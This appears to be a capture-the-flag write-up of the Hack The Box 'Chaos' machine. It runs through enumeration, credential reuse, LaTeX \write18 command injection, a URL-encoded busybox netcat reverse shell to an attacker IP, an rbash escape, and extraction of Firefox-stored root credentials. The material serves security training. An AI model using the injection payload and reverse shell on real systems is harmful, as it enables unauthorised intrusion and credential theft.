# HTB - Chaos

#### Ip: 10.129.130.122
#### Name: Chaos
#### Rating: Medium

----------------------------------------------------------------------

htb_chaos_card.png

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Chaos]
└─$ sudo nmap -p- -sC -sV --min-rate=10000 10.129.130.122   
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-29 10:43 CDT
Nmap scan report for 10.129.130.122
Host is up (0.073s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.34 (Ubuntu)
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL PIPELINING RESP-CODES TOP AUTH-RESP-CODE SASL STLS CAPA
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: listed LOGINDISABLEDA0001 more LITERAL+ ENABLE have post-login capabilities OK LOGIN-REFERRALS STARTTLS Pre-login SASL-IR IDLE ID IMAP4rev1
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: listed more LITERAL+ ENABLE OK post-login capabilities AUTH=PLAINA0001 IDLE have Pre-login SASL-IR LOGIN-REFERRALS ID IMAP4rev1
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: UIDL PIPELINING RESP-CODES TOP AUTH-RESP-CODE USER SASL(PLAIN) CAPA
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.88 seconds
```

Ok, looks like we've got 2 http ports open and then several mail ports.

Looking at the page on port 80 we find:

htb_chaos_site.png

Scanning for directories on port 80 we discover a wordpress endpoint:

```
┌──(ryan㉿kali)-[~/HTB/Chaos]
└─$ feroxbuster --url http://10.129.130.122 -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 302,400,403,404 -x php, js
404      GET        -l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        5w       73c http://10.129.130.122/
301      GET        9l       28w      313c http://10.129.130.122/wp => http://10.129.130.122/wp/
301      GET        9l       28w      321c http://10.129.130.122/javascript => http://10.129.130.122/javascript/
```

Which tries to forward to http://wordpress.chaos.htb/ so let's add that to `/etc/hosts`:

Once added we can access a new site at http://chaos.htb:

htb_chaos_url.png

And looking at the wordpress site we find it is protected:

htb_chaos_protected.png

Scanning for vhosts we find webmail.chaos.htb, so let's add that to `/etc/hosts` as well:

```
┌──(ryan㉿kali)-[~/HTB/Chaos]
└─$ ffuf -u http://chaos.htb -H 'HOST: FUZZ.chaos.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -fw 5 -mc all 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://chaos.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.chaos.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 5
________________________________________________

[Status: 200, Size: 5607, Words: 649, Lines: 121, Duration: 4445ms]
    * FUZZ: webmail

[Status: 200, Size: 53511, Words: 3347, Lines: 323, Duration: 8469ms]
    * FUZZ: wordpress
```

This takes us to a roundcube login:

htb_chaos_webmail.png

Running wpscan against the wordpress instance we find one potential user:

```
┌──(ryan㉿kali)-[~/HTB/Chaos]
└─$ wpscan --url http://wordpress.chaos.htb/ --enumerate vp,u,vt,tt
<SNIP>
[+] human
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordpress.chaos.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

Trying the credentials `human:human` gets us access to the protected post:

htb_chaos_creds.png

So now we have some new creds: `ayush:jiujitsu`

Logging into the roundcube instance at webmail.chaos.htb, there is nothing in ayush's inbox, but there is an interesting draft:

htb_chaos_draft.png

This gives us a new username (and potential password), as well as two files to download.

Let's download these files and move them to our working directory:

```
┌──(ryan㉿kali)-[~/HTB/Chaos]
└─$ mv ~/Downloads/enim_msg.txt .  
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Chaos]
└─$ mv ~/Downloads/en.py . 
```

enim_msg.txt is an encrypted text document and en.py is the script used to encrypt it:

```python
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()

```

I had ChatGPT create a script using the same code to decrypt this:

```python
import os
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random

def getKey(password):
    hasher = SHA256.new(password.encode('utf-8'))
    return hasher.digest()

def decrypt(key, filename):
    chunksize = 64 * 1024
    outputFile = filename[2:]  # Strip "en" prefix, e.g., enim_msg.txt -> im_msg.txt

    with open(filename, 'rb') as infile:
        origsize = int(infile.read(16))
        IV = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(outputFile, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)

# ---- RUN DECRYPTION ----

# Replace with your actual password
password = "sahay"

# Generate key from password
key = getKey(password)

# Decrypt the file
decrypt(key, "enim_msg.txt")

print("Decryption complete. Output saved as: im_msg.txt")

```

```
┌──(ryan㉿kali)-[~/HTB/Chaos]
└─$ python decrypt.py
Decryption complete. Output saved as: im_msg.txt
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Chaos]
└─$ cat im_msg.txt 
SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK
```

Let's decode this base64:

```
┌──(ryan㉿kali)-[~/HTB/Chaos]
└─$ echo "SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK" | base64 -d
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush
```

Navigating tot his new URL we find a pdf creator:

htb_chaos_test.png

Capturing this in burp and trying some LaTex injections, we find there is blacklisting in place:

htb_chaos_blacklisted.png

We do find that template test3 will actually create a PDF:

```
FILE CREATED: c664763e20c93be739b1d26eea0260e4.pdf
Download: http://chaos.htb/pdf/c664763e20c93be739b1d26eea0260e4.pdf


LOG:
This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)
 \write18 enabled.
entering extended mode
(./c664763e20c93be739b1d26eea0260e4.tex
LaTeX2e <2018-04-01> patch level 5
```

But rather than storing the file at http://chaos.htb/pdf/random_file_name it is instead stored at http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/pdf/

Browsing the `/pdf` folder, we find several test PDFs made, and confirm that injection must be possible because we discover a base64 encoded `/etc/passwd`

htb_chaos_b64.png

This is interesting and at first I thought it must be the result of one of my injection attempts, but I see that the files were created in 2018 (the year the box was released) and after reverting the box the file remains. 

Decoding this in cyberchef, we can confirm the users ayush and sahay:

```
ayush:x:1000:1000:,,,:/home/ayush:/bin/bash
pulse:x:129:136:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
statd:x:135:65534::/var/lib/nfs:/usr/sbin/nologin
lightdm:x:136:143:Light Display Manager:/var/lib/lightdm:/bin/false
redis:x:137:145::/var/lib/redis:/usr/sbin/nologin
sahay:x:33:33::/home/sahay:/bin/bash
```

So this seems reassuring that some type of injection vulnerability exists.

### Exploitation

Going back to the drawing board and testing the different test templates, I find we have successful injection in template test1 using `\write18{id}`

htb_chaos_id.png

Cool, let's use this to issue a URL encoded reverse shell oneliner:

```
content=\write18{busybox%20nc%2010.10.14.234%209001%20-e%20%2Fbin%2Fbash}&template=test1
```


And catch as shell back:

```
┌──(ryan㉿kali)-[~/HTB/Chaos]
└─$ nc -lnvp 9001        
listening on [any] 9001 ...
connect to [10.10.14.234] from (UNKNOWN) [10.129.28.99] 34364
whoami
www-data
hostname
chaos
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ 
```

However we are still unable to get into any of the users `/home` directories:

```
www-data@chaos:/home$ ls
ayush  sahay
www-data@chaos:/home$ cd ayush
bash: cd: ayush: Permission denied
www-data@chaos:/home$ cd sahay 
bash: cd: sahay: Permission denied
```

Remembering there was a wordpress instance running, I can check in wp-config.php and find some credentials:

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp');

/** MySQL database username */
define('DB_USER', 'roundcube');

/** MySQL database password */
define('DB_PASSWORD', 'inner[OnCag8');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Logging in and looking at the roundcubemail database, we find what looks to be a password hash for ayush:

```
mysql> select * from rc_users;
+---------+----------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login | failed_login_counter | language | preferences                                       |
+---------+----------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
|       1 | ayush    | localhost | 2018-10-28 12:10:08 | 2018-10-28 12:17:40 | NULL         |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"RtiFliMyCQJHsnsS";} |
+---------+----------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
1 row in set (0.01 sec)
```

However so far I am unable to crack this or use it.

Also in the db we find a few session hashes, but again, so far cannot crack them:

htb_chaos_session_hashes.png

Continuing to enumerate the db I re-discovered credentials I'd unfortunately forgotten about (doh!):

```
              | publish     | open           | open        | human         | chaos                |         |        | 2018-10-28 11:34:12 | 2018-10-28 11:34:12 |                       |           0 | http://wordpress.chaos.htb/wp/wordpress/?p=6                                |          0 | post      |                |             0 |
|  7 |           1 | 2018-10-28 11:34:12 | 2018-10-28 11:34:12 | Creds for webmail :

username � ayush

password � jiujitsu 
```

I was able to simply reuse these to `su ayush`:

```
www-data@chaos:/var/www/roundcube/config$ cd /home
www-data@chaos:/home$ ls
ayush  sahay
www-data@chaos:/home$ whoami
www-data
www-data@chaos:/home$ su ayush
Password: 
ayush@chaos:/home$ whoami
rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
```

But now it appears we are in an rbash shell.

```
ayush@chaos:/home$ echo $SHELL
/opt/rbash
ayush@chaos:/home$ echo $PATH
/home/ayush/.app
```

We can bypass the restriction on the `cat` command by using `dir` instead:

```
ayush@chaos:/home$ dir -la '/home/ayush'    
total 40
drwx------ 6 ayush ayush 4096 Jul 30 19:07 .
drwxr-xr-x 4 root  root  4096 Jun 30  2022 ..
drwxr-xr-x 2 root  root  4096 Jun 30  2022 .app
lrwxrwxrwx 1 root  root     9 Jul 12  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ayush ayush  220 Oct 28  2018 .bash_logout
-rwxr-xr-x 1 root  root    22 Oct 28  2018 .bashrc
drwx------ 3 ayush ayush 4096 Jul 30 19:07 .gnupg
drwx------ 3 ayush ayush 4096 Jun 30  2022 mail
drwx------ 4 ayush ayush 4096 Jun 30  2022 .mozilla
-rw-r--r-- 1 ayush ayush  807 Oct 28  2018 .profile
-rw------- 1 ayush ayush   33 Jul 30 16:25 user.txt
```

```
ayush@chaos:/home$ dir -la '/home/ayush/.app'
total 8
drwxr-xr-x 2 root  root  4096 Jun 30  2022 .
drwx------ 6 ayush ayush 4096 Jul 30 19:07 ..
lrwxrwxrwx 1 root  root     8 Oct 28  2018 dir -> /bin/dir
lrwxrwxrwx 1 root  root     9 Oct 28  2018 ping -> /bin/ping
lrwxrwxrwx 1 root  root     8 Oct 28  2018 tar -> /bin/tar
```

Luckily for us we can still use the `export` command and simply run:

```
export SHELL=/bin/bash
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

Which gives us a normal shell.

From here we can (finally) grab the user.txt flag:

htb_chaos_user.png

### Privilege Escalation

Browsing around we see a `/.mozilla` directory in ayush's home folder.

Let's use firefox_decrypt.py to try extracting any stored credentials. For this I had to use the python2 version: https://github.com/unode/firefox_decrypt/releases/tag/0.7.0

```
ayush@chaos:~$ wget 10.10.14.234/firefox_decrypt.py
--2025-07-30 19:54:54--  http://10.10.14.234/firefox_decrypt.py
Connecting to 10.10.14.234:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 28155 (27K) [text/x-python]
Saving to: ‘firefox_decrypt.py’

firefox_decrypt.py  100%[===================>]  27.50K  --.-KB/s    in 0.08s   

2025-07-30 19:54:54 (359 KB/s) - ‘firefox_decrypt.py’ saved [28155/28155]

ayush@chaos:~$ python firefox_decrypt.py 

Master Password for profile /home/ayush/.mozilla/firefox/bzo7sjt1.default: 

Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'
```

Before trying this credential on webmin I decided to test for credential reuse for root and got lucky:

```
ayush@chaos:~$ su -
Password: 
root@chaos:~# whoami
root
root@chaos:~#
```

From here we can grab the final flag:

htb_chaos_root.png

Thanks for following along!

-Ryan

----------------------------------------